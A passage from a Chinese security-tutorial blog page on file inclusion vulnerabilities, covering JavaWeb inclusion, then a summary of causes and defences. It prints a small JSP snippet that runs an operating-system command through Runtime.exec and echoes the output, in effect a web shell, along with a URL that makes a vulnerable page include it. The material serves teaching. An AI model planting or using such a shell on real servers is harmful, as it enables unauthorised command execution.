<p>在<code>test.jsp</code>的相同目录新建一个<code>1.jsp</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">Process p;</span><br><span class="line">p = Runtime.getRuntime().exec(&quot;操作系统命令&quot;);</span><br><span class="line">OutputStream os = p.getOutputStream();</span><br><span class="line">InputStream in = p.getInputStream();</span><br><span class="line">DataInputStream dis = new DataInputStream(in);</span><br><span class="line">String disr = dis.readLine();</span><br><span class="line">while ( disr != null ) &#123;</span><br><span class="line">   out.println(disr);</span><br><span class="line">   disr = dis.readLine();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>然后访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8080/path/test.jsp?payload=1.jsp</span><br></pre></td></tr></table></figure>

<p>让1.jsp被包含</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847481.png" data-fancybox="true"/></div></div>

<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p>在本实验中被包含文件后缀会被识别,不会强制当成jsp代码执行,另外一种包含的方式<code>&lt;%@include file=&#39;文件&#39;%&gt;</code>可以…但是file后面的东西必须是字符串,不能是变量,因此无法造成文件包含漏洞…</p>
<p>由此可见,Javaweb在这方面的安全性比PHP会高一些</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>文件包含漏洞是一种常见的Web应用程序安全漏洞,它可以导致攻击者能够访问敏感文件、执行任意代码或获取系统权限.攻击者可以利用这些漏洞在Web服务器上执行恶意代码,获取系统权限,并在服务器上进行不良操作.</p>
<p>文件包含漏洞的根本原因是没有正确地对用户输入进行过滤和验证,或者没有正确地处理文件路径.为了防止文件包含漏洞,开发人员应该采取一些最佳实践,例如使用白名单而不是黑名单、验证输入和转义特殊字符等.</p>
<p>在Web应用程序的设计和开发过程中,开发人员应该始终考虑安全性,并确保采用了最佳的安全实践.对于现有的Web应用程序,开发人员应该对其进行安全评估,以识别并修复可能存在的漏洞.最后,定期更新服务器上的软件和操作系统以及应用程序代码,以确保Web应用程序的安全性.</p>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">回顾上一篇</div><a href="/wiki/VulnerabilityInsightDocs/%E5%85%AD.%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html">六. 文件上传</a></div><div class="item" id="next"><div class="note">接下来阅读</div><a href="/wiki/VulnerabilityInsightDocs/%E5%85%AB.%20%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5.html">八. 同源策略</a></div></section></div>


  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>快来参与讨论吧~</p>

    </section>
    <section class='body cmt-body waline'>
      

<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>

    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
  <!--不蒜子计数器-->
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
  <br>
  <span id="runtime_span"></span>
  <script type="text/javascript">
    // JavaScript for showing runtime here
  </script>
</center>
<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
</div>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">什么是文件包含?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI"><span class="toc-text">本地文件包含(LFI)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFI"><span class="toc-text">远程文件包含(RFI)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%9D%E5%A4%96%E8%A6%81%E6%B1%82"><span class="toc-text">额外要求</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-text">文件包含漏洞产生的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="toc-text">文件包含漏洞的危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-text">文件包含漏洞的防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-text">DVWA靶场实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-text">low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload1-%E6%9C%AC%E5%9C%B0%E2%80%93%E5%88%A9%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84-%E8%AE%B8%E5%A4%9A%E4%B8%AA-%E5%B0%B1%E4%B8%80%E5%AE%9A%E4%BC%9A%E6%9D%A5%E5%88%B0%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-text">payload1:本地–利用相对路径(许多个..&#x2F;就一定会来到根目录)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload2-%E6%9C%AC%E5%9C%B0%E2%80%93%E5%88%A9%E7%94%A8%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">payload2:本地–利用绝对路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload3-%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB"><span class="toc-text">payload3:远程包含</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium"><span class="toc-text">medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload1-%E6%9C%AC%E5%9C%B0%E2%80%93%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-text">payload1:本地–绝对路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload2-%E8%BF%9C%E7%A8%8B%E2%80%93%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">payload2:远程–双写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload3-%E8%BF%9C%E7%A8%8B%E2%80%93%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">payload3:远程–大小写绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload4-%E8%BF%9C%E7%A8%8B%E6%9C%AC%E5%9C%B0%E7%9A%86%E5%8F%AF%E2%80%93%E4%BD%BF%E7%94%A8http-https%E5%A4%96%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-text">payload4:远程本地皆可–使用http&#x2F;https外的协议</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#high"><span class="toc-text">high</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload1-file%E5%8D%8F%E8%AE%AE"><span class="toc-text">payload1:file协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-text">Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#data%E5%8D%8F%E8%AE%AE%E5%8F%8D%E5%BC%B9Shell"><span class="toc-text">data协议反弹Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%93%E5%90%88"><span class="toc-text">session与文件包含漏洞的结合</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-text">思考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="toc-text">包含日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABSSH-log"><span class="toc-text">包含SSH log</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%ABenviron"><span class="toc-text">包含environ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">包含临时文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-text">文件包含漏洞常见绕过技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00%E5%AD%97%E7%AC%A6%E6%88%AA%E6%96%AD"><span class="toc-text">00字符截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%AF%E5%BE%84%E9%95%BF%E5%BA%A6%E6%88%AA%E6%96%AD"><span class="toc-text">路径长度截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-text">目录遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BB%95%E8%BF%87"><span class="toc-text">URL绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#query"><span class="toc-text">query(?)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fragment"><span class="toc-text">fragment(#)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#require-once%E7%BB%95%E8%BF%87%E9%87%8D%E5%A4%8D%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6"><span class="toc-text">require_once绕过重复包含文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter%E7%BB%95%E8%BF%87exit"><span class="toc-text">php:&#x2F;&#x2F;filter绕过exit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">文件包含漏洞常见的伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E6%B5%81"><span class="toc-text">php:&#x2F;&#x2F; 输入输出流</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-text">过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-1"><span class="toc-text">条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">phar:&#x2F;&#x2F;伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-1"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-1"><span class="toc-text">过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zip%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">zip伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-2"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-2"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-2"><span class="toc-text">过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input"><span class="toc-text">php:&#x2F;&#x2F;input</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E6%B3%95-3"><span class="toc-text">用法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6-3"><span class="toc-text">条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B-3"><span class="toc-text">过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REF"><span class="toc-text">REF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85-%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84%E6%95%8F%E6%84%9F%E8%B7%AF%E5%BE%84"><span class="toc-text">补充:系统中的敏感路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Javaweb-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E6%89%A9%E5%B1%95"><span class="toc-text">Javaweb:文件包含(扩展)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E4%B9%A0"><span class="toc-text">漏洞复习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">注意事项</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.27.0" async></script>

<!-- optional -->

  <script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'

  function load_comment(){
    if(!document.getElementById("waline_container"))return;

    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');

    const el = document.getElementById("waline_container");
    var path = el.getAttribute('comment_id');
    if (!path) {
      path = decodeURI(window.location.pathname);
    }

    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
      el: '#waline_container',
      path: path,
      
    }));

  }
  window.addEventListener('DOMContentLoaded', (event) => {
    load_comment();
  });

</script>




<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
